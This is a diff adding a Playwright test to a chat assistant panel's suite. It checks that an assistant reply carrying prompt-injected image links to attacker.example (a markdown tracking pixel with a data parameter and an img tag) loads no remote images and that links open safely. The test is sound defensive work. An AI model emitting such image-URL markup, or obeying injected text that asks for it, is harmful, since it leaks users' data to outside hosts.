@@ -1,4 +1,4 @@
-// Chat assistant panel failure states (CHAT-001, CHAT-002) against the local Herd site.
+// Chat assistant panel failure states and reply rendering (CHAT-001, CHAT-002) against the local Herd site.
 //
 // None of these reach the LLM provider: the refusal comes from
 // ContentModerationService, which blocks the message before any provider call,
@@ -102,6 +102,44 @@ test('a dropped stream connection shows a generic connection error and restores 
     await expect(page.getByText('Connection error. Please try again.')).toBeVisible();
     await expect(page.getByText(WELCOME)).toBeVisible();
     await expect(input).toHaveValue('Summarise my spending');
+
+    expect(errors).toEqual([]);
+});
+
+test('an assistant reply never loads remote images and its links open safely in a new tab', async ({ throwawayUser }) => {
+    const user = await throwawayUser('chat');
+    const { page, errors } = user;
+
+    // A prompt-injected reply that tries to exfiltrate data through image URLs.
+    const reply = 'Your balance is fine. ![tracking pixel](https://attacker.example/p?d=1234) '
+        + '<img src="https://attacker.example/raw"> See [the docs](https://example.com/help).';
+    const remoteRequests = [];
+    await page.route('https://attacker.example/**', (route) => {
+        remoteRequests.push(route.request().url());
+        return route.abort();
+    });
+    await mockStream(page, {
+        status: 200,
+        headers: { 'Content-Type': 'text/event-stream', 'Cache-Control': 'no-cache' },
+        body: `event: text_delta\ndata: ${JSON.stringify({ delta: reply })}\n\n`
+            + 'event: stream_end\ndata: {"finish_reason":"stop"}\n\n',
+    });
+    await page.route('**/chat/stream/complete', (route) => route.fulfill({ json: { success: true } }));
+
+    const input = await openChat(page);
+    await input.fill('How am I doing?');
+    await input.press('Enter');
+
+    const message = page.locator('.markdown-content').filter({ hasText: 'Your balance is fine.' });
+    await expect(message).toBeVisible();
+    await expect(message).toContainText('tracking pixel');
+    await expect(message.locator('img')).toHaveCount(0);
+
+    const link = message.getByRole('link', { name: 'the docs' });
+    await expect(link).toHaveAttribute('href', 'https://example.com/help');
+    await expect(link).toHaveAttribute('target', '_blank');
+    await expect(link).toHaveAttribute('rel', 'noopener noreferrer nofollow');
+    expect(remoteRequests).toEqual([]);
 
     expect(errors).toEqual([]);
 });
